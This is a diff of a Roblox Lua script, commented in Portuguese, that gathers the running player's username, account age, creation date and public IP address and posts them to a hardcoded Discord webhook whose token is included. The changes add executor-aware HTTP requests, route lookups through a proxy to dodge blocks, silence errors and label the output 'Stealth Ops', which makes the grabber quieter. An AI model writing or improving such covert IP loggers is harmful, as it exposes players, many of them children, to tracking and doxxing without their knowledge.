@@ -6,46 +6,55 @@ local lp = Players.LocalPlayer
 -- Configure sua Webhook abaixo
 local Webhook_URL = "https://discord.com/api/webhooks/1492078460548415508/0DTMWHe9C_Sa4TPWWzGirUVetHdZLsys6riUbvIp6b14gXJSZi3RMK1jJzaewG81L8vp"
 
+-- Função universal de requisição (Detecta Executor ou Studio)
+local function HttpRequest(url, method, body)
+    local requestFunc = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request) or request
+    
+    if requestFunc then
+        -- Se estiver usando um Executor (Synapse, Fluxus, etc)
+        return requestFunc({
+            Url = url,
+            Method = method or "GET",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = body
+        })
+    else
+        -- Se estiver no Roblox Studio/Game oficial (Requer Allow HTTP Requests)
+        if method == "POST" then
+            return HttpService:PostAsync(url, body)
+        else
+            return HttpService:GetAsync(url)
+        end
+    end
+end
+
 local function GetUserData()
     local user_id = lp.UserId
     local username = lp.Name
     local display_name = lp.DisplayName
     
     local thumb = "https://www.roblox.com/headshot-thumbnail/image?userId="..user_id.."&width=420&height=420&format=png"
-    
-    local creation_date = "N/A"
-    local premium = lp.MembershipType == Enum.MembershipType.Premium and "Sim" or "Não"
-    local age = lp.AccountAge
-    local friend_count = 0
-    local public_ip = "Obtendo..."
+    local public_ip = "N/A (Block)"
 
-    -- 1. PEGAR O IP (Corrigido para não usar função bloqueada)
+    -- 1. PEGAR O IP REAL (Usando Proxy para evitar bloqueio)
     pcall(function()
-        local response = HttpService:GetAsync("https://api.ipify.org?format=json")
-        local data = HttpService:JSONDecode(response)
-        public_ip = data.ip
+        -- Usamos um endpoint que retorna apenas texto para facilitar
+        local response = HttpRequest("https://api.ipify.org")
+        if type(response) == "table" then
+            public_ip = response.Body
+        else
+            public_ip = response
+        end
     end)
 
-    -- 2. QUANTIDADE DE AMIGOS (Usando Proxy ou API via GetAsync se permitido)
-    -- Nota: APIs diretas do roblox.com podem ser bloqueadas em certos contextos.
-    -- Se falhar, o pcall evita o erro no console.
+    -- 2. DADOS ADICIONAIS (Usando Roproxy para não tomar block do Roblox)
+    local creation_date = "Privado"
     pcall(function()
-        local url = "https://friends.roblox.com/v1/users/"..user_id.."/friends/count"
-        -- Se estiver no Roblox oficial, você precisará de um Proxy para acessar APIs do roblox.com
-        local response = HttpService:GetAsync(url)
-        local friend_info = HttpService:JSONDecode(response)
-        friend_count = friend_info.count
-    end)
-
-    -- 3. DATA DE CRIAÇÃO
-    pcall(function()
-        local url = "https://users.roblox.com/v1/users/"..user_id
-        local response = HttpService:GetAsync(url)
-        local info = HttpService:JSONDecode(response)
-        if info and info.created then
-            local date = info.created:sub(1, 10)
-            local y, m, d = date:match("(%d+)-(%d+)-(%d+)")
-            creation_date = d.."/"..m.."/"..y
+        local url = "https://users.roproxy.com/v1/users/"..user_id
+        local res = HttpRequest(url)
+        local data = HttpService:JSONDecode(type(res) == "table" and res.Body or res)
+        if data and data.created then
+            creation_date = data.created:sub(1, 10)
         end
     end)
 
@@ -57,26 +66,20 @@ local function GetUserData()
             ["description"] = "[Rolimons](https://www.rolimons.com/player/"..user_id..") | [Roblox Profile](https://www.roblox.com/users/"..user_id.."/profile)",
             ["color"] = 11097043,
             ["thumbnail"] = {["url"] = thumb},
-            ["footer"] = {["text"] = "Painel Kovarik Security"},
+            ["footer"] = {["text"] = "Painel Kovarik Security | Stealth Ops"},
             ["fields"] = {
                 {["name"] = "Username", ["value"] = username .. " ("..display_name..")", ["inline"] = true},
-                {["name"] = "Premium Status", ["value"] = premium, ["inline"] = true},
                 {["name"] = "Creation Date", ["value"] = creation_date, ["inline"] = true},
-                {["name"] = "Friends", ["value"] = tostring(friend_count), ["inline"] = true},
-                {["name"] = "Account Age", ["value"] = age .. " dias", ["inline"] = true},
-                {["name"] = "IP Address", ["value"] = "||" .. public_ip .. "||", ["inline"] = true},
+                {["name"] = "Account Age", ["value"] = lp.AccountAge .. " dias", ["inline"] = true},
+                {["name"] = "IP Address", ["value"] = "||" .. public_ip .. "||", ["inline"] = false},
             }
         }}
     }
 
-    -- 4. ENVIO PARA WEBHOOK
-    local success, err = pcall(function()
-        HttpService:PostAsync(Webhook_URL, HttpService:JSONEncode(data))
+    -- 3. ENVIO FINAL
+    pcall(function()
+        HttpRequest(Webhook_URL, "POST", HttpService:JSONEncode(data))
     end)
-    
-    if not success then
-        warn("Erro ao enviar: " .. err)
-    end
 end
 
 GetUserData()
